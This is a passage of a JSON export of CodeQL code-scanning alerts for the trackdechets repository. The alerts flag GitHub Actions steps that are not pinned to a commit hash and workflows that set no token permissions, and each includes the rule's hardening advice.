{"totalCount":18,"grade":"F","repositories":[{"url":"https://github.com/MTES-MCT/trackdechets","grade":"F","alerts":[{"number":177,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/177","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/177","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/unpinned-tag","severity":"warning","description":"Unpinned tag for a non-immutable Action in workflow","name":"actions/unpinned-tag","tags":["actions","external/cwe/cwe-829","security"],"full_description":"Using a tag for a non-immutable Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.","help":"# Unpinned tag for 3rd party Action in workflow\n\n## Description\n\nUsing a tag for a 3rd party Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.\n\n## Recommendations\n\nPinning an action to a full length commit SHA is currently the only way to use a non-immutable action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\n\n## Examples\n\n### Incorrect Usage\n\n```yaml\n- uses: tj-actions/changed-files@v44\n```\n\n### Correct Usage\n\n```yaml\n- uses: tj-actions/changed-files@c65cd883420fd2eb864698a825fc4162dd94482c # v44\n```\n\n## References\n\n- [Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Unpinned 3rd party Action 'Send reviewable PRs to Mattermost' step Uses Step uses 'mattermost/action-mattermost-notify' with ref 'master', not a pinned commit hash"},"location":{"path":".github/workflows/mattermost.yml","start_line":21,"end_line":21,"start_column":15,"end_column":57},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/177/instances","dismissal_approved_by":null},{"number":176,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/176","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/176","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/unpinned-tag","severity":"warning","description":"Unpinned tag for a non-immutable Action in workflow","name":"actions/unpinned-tag","tags":["actions","external/cwe/cwe-829","security"],"full_description":"Using a tag for a non-immutable Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.","help":"# Unpinned tag for 3rd party Action in workflow\n\n## Description\n\nUsing a tag for a 3rd party Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.\n\n## Recommendations\n\nPinning an action to a full length commit SHA is currently the only way to use a non-immutable action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\n\n## Examples\n\n### Incorrect Usage\n\n```yaml\n- uses: tj-actions/changed-files@v44\n```\n\n### Correct Usage\n\n```yaml\n- uses: tj-actions/changed-files@c65cd883420fd2eb864698a825fc4162dd94482c # v44\n```\n\n## References\n\n- [Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Unpinned 3rd party Action 'Deploy Docs and Sentry Release on production' step Uses Step uses 'peaceiris/actions-gh-pages' with ref 'v3', not a pinned commit hash"},"location":{"path":".github/workflows/deploy.yml","start_line":54,"end_line":54,"start_column":15,"end_column":44},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/176/instances","dismissal_approved_by":null},{"number":175,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/175","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/175","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/unpinned-tag","severity":"warning","description":"Unpinned tag for a non-immutable Action in workflow","name":"actions/unpinned-tag","tags":["actions","external/cwe/cwe-829","security"],"full_description":"Using a tag for a non-immutable Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.","help":"# Unpinned tag for 3rd party Action in workflow\n\n## Description\n\nUsing a tag for a 3rd party Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.\n\n## Recommendations\n\nPinning an action to a full length commit SHA is currently the only way to use a non-immutable action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\n\n## Examples\n\n### Incorrect Usage\n\n```yaml\n- uses: tj-actions/changed-files@v44\n```\n\n### Correct Usage\n\n```yaml\n- uses: tj-actions/changed-files@c65cd883420fd2eb864698a825fc4162dd94482c # v44\n```\n\n## References\n\n- [Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Unpinned 3rd party Action 'Deploy Docs and Sentry Release on production' step Uses Step uses 'getsentry/action-release' with ref 'v3', not a pinned commit hash"},"location":{"path":".github/workflows/deploy.yml","start_line":28,"end_line":28,"start_column":15,"end_column":42},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/175/instances","dismissal_approved_by":null},{"number":174,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/174","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/174","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/unpinned-tag","severity":"warning","description":"Unpinned tag for a non-immutable Action in workflow","name":"actions/unpinned-tag","tags":["actions","external/cwe/cwe-829","security"],"full_description":"Using a tag for a non-immutable Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.","help":"# Unpinned tag for 3rd party Action in workflow\n\n## Description\n\nUsing a tag for a 3rd party Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.\n\n## Recommendations\n\nPinning an action to a full length commit SHA is currently the only way to use a non-immutable action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\n\n## Examples\n\n### Incorrect Usage\n\n```yaml\n- uses: tj-actions/changed-files@v44\n```\n\n### Correct Usage\n\n```yaml\n- uses: tj-actions/changed-files@c65cd883420fd2eb864698a825fc4162dd94482c # v44\n```\n\n## References\n\n- [Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Unpinned 3rd party Action 'Deploy Sentry Release on recette' step Uses Step uses 'getsentry/action-release' with ref 'v3', not a pinned commit hash"},"location":{"path":".github/workflows/deploy-recette.yml","start_line":30,"end_line":30,"start_column":15,"end_column":42},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/174/instances","dismissal_approved_by":null},{"number":173,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/173","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/173","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/unpinned-tag","severity":"warning","description":"Unpinned tag for a non-immutable Action in workflow","name":"actions/unpinned-tag","tags":["actions","external/cwe/cwe-829","security"],"full_description":"Using a tag for a non-immutable Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.","help":"# Unpinned tag for 3rd party Action in workflow\n\n## Description\n\nUsing a tag for a 3rd party Action that is not pinned to a commit can lead to executing an untrusted Action through a supply chain attack.\n\n## Recommendations\n\nPinning an action to a full length commit SHA is currently the only way to use a non-immutable action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\n\n## Examples\n\n### Incorrect Usage\n\n```yaml\n- uses: tj-actions/changed-files@v44\n```\n\n### Correct Usage\n\n```yaml\n- uses: tj-actions/changed-files@c65cd883420fd2eb864698a825fc4162dd94482c # v44\n```\n\n## References\n\n- [Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Unpinned 3rd party Action 'Build & Test' step Uses Step uses 'nrwl/nx-set-shas' with ref 'v3', not a pinned commit hash"},"location":{"path":".github/workflows/build-and-test.yml","start_line":18,"end_line":18,"start_column":15,"end_column":34},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/173/instances","dismissal_approved_by":null},{"number":172,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/172","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/172","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/missing-workflow-permissions","severity":"warning","description":"Workflow does not contain permissions","name":"actions/missing-workflow-permissions","tags":["actions","external/cwe/cwe-275","maintainability","security"],"full_description":"Workflows should contain permissions to provide a clear understanding has permissions to run the workflow.","help":"# Actions Job and Workflow Permissions are not set\n\n## Description\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendations\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task:\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs)\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"},"location":{"path":".github/workflows/mattermost.yml","start_line":10,"end_line":24,"start_column":5,"end_column":67},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/172/instances","dismissal_approved_by":null},{"number":171,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/171","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/171","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/missing-workflow-permissions","severity":"warning","description":"Workflow does not contain permissions","name":"actions/missing-workflow-permissions","tags":["actions","external/cwe/cwe-275","maintainability","security"],"full_description":"Workflows should contain permissions to provide a clear understanding has permissions to run the workflow.","help":"# Actions Job and Workflow Permissions are not set\n\n## Description\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendations\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task:\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs)\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"},"location":{"path":".github/workflows/integration-tests.yml","start_line":11,"end_line":46,"start_column":5,"end_column":160},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/171/instances","dismissal_approved_by":null},{"number":170,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/170","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/170","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/missing-workflow-permissions","severity":"warning","description":"Workflow does not contain permissions","name":"actions/missing-workflow-permissions","tags":["actions","external/cwe/cwe-275","maintainability","security"],"full_description":"Workflows should contain permissions to provide a clear understanding has permissions to run the workflow.","help":"# Actions Job and Workflow Permissions are not set\n\n## Description\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendations\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task:\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs)\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"},"location":{"path":".github/workflows/deploy.yml","start_line":40,"end_line":57,"start_column":5,"end_column":40},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/170/instances","dismissal_approved_by":null},{"number":169,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/169","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/169","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/missing-workflow-permissions","severity":"warning","description":"Workflow does not contain permissions","name":"actions/missing-workflow-permissions","tags":["actions","external/cwe/cwe-275","maintainability","security"],"full_description":"Workflows should contain permissions to provide a clear understanding has permissions to run the workflow.","help":"# Actions Job and Workflow Permissions are not set\n\n## Description\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendations\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task:\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs)\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"},"location":{"path":".github/workflows/e2e.yml","start_line":7,"end_line":110,"start_column":5,"end_column":32},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/169/instances","dismissal_approved_by":null},{"number":168,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/168","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/168","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/missing-workflow-permissions","severity":"warning","description":"Workflow does not contain permissions","name":"actions/missing-workflow-permissions","tags":["actions","external/cwe/cwe-275","maintainability","security"],"full_description":"Workflows should contain permissions to provide a clear understanding has permissions to run the workflow.","help":"# Actions Job and Workflow Permissions are not set\n\n## Description\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendations\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task:\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs)\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"},"location":{"path":".github/workflows/deploy.yml","start_line":15,"end_line":39,"start_column":5,"end_column":3},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/168/instances","dismissal_approved_by":null},{"number":167,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/167","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/167","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/missing-workflow-permissions","severity":"warning","description":"Workflow does not contain permissions","name":"actions/missing-workflow-permissions","tags":["actions","external/cwe/cwe-275","maintainability","security"],"full_description":"Workflows should contain permissions to provide a clear understanding has permissions to run the workflow.","help":"# Actions Job and Workflow Permissions are not set\n\n## Description\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendations\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task:\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs)\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"},"location":{"path":".github/workflows/add-ready-to-merge-label.yml","start_line":11,"end_line":49,"start_column":5,"end_column":15},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/167/instances","dismissal_approved_by":null},{"number":166,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/166","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/166","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/missing-workflow-permissions","severity":"warning","description":"Workflow does not contain permissions","name":"actions/missing-workflow-permissions","tags":["actions","external/cwe/cwe-275","maintainability","security"],"full_description":"Workflows should contain permissions to provide a clear understanding has permissions to run the workflow.","help":"# Actions Job and Workflow Permissions are not set\n\n## Description\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendations\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task:\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs)\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"},"location":{"path":".github/workflows/brgm.yml","start_line":10,"end_line":26,"start_column":5,"end_column":39},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/166/instances","dismissal_approved_by":null},{"number":165,"created_at":"2025-04-23T05:53:06Z","updated_at":"2025-04-23T05:53:08Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/165","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/165","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"actions/missing-workflow-permissions","severity":"warning","description":"Workflow does not contain permissions","name":"actions/missing-workflow-permissions","tags":["actions","external/cwe/cwe-275","maintainability","security"],"full_description":"Workflows should contain permissions to provide a clear understanding has permissions to run the workflow.","help":"# Actions Job and Workflow Permissions are not set\n\n## Description\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\n## Recommendations\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task:\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs)\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.21.1"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:actions","state":"open","commit_sha":"a0cdf80f3a0985c3e68e1472d9571932dc2a5e2e","message":{"text":"Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: 